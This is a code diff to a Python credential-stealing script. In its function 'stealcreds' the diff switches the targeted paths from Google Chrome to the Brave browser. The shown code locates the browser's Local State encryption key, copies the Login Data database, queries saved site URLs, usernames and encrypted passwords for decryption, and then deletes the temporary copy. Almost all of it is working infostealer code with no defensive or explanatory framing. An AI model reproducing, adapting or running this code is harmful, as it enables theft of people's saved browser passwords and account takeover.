@@ -15,7 +15,7 @@ def my_chrome_datetime(time_in_mseconds):
 
 def encryption_key():
     localState_path = os.path.join(os.environ["USERPROFILE"],
-                                    "AppData", "Local", "Google", "Chrome",
+                                    "AppData", "Local", "BraveSoftware", "Brave-Browser",
                                     "User Data", "Local State")
     with open(localState_path, "r", encoding="utf-8") as file:
         local_state_file = file.read()
@@ -37,9 +37,9 @@ def decrypt_password(enc_password, key):
 
 def stealcreds():
     password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                            "Google", "Chrome", "User Data", "Default", "Login Data")
-    shutil.copyfile(password_db_path,"my_chrome_data.db")
-    db = sqlite3.connect("my_chrome_data.db")
+                            "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
+    shutil.copyfile(password_db_path, "my_brave_data.db")
+    db = sqlite3.connect("my_brave_data.db")
     cursor = db.cursor()
     cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
     encp_key = encryption_key()
@@ -60,6 +60,6 @@ def stealcreds():
             continue 
     cursor.close()
     db.close()
-    os.remove("my_chrome_data.db")
+    os.remove("my_brave_data.db")
     
     return data
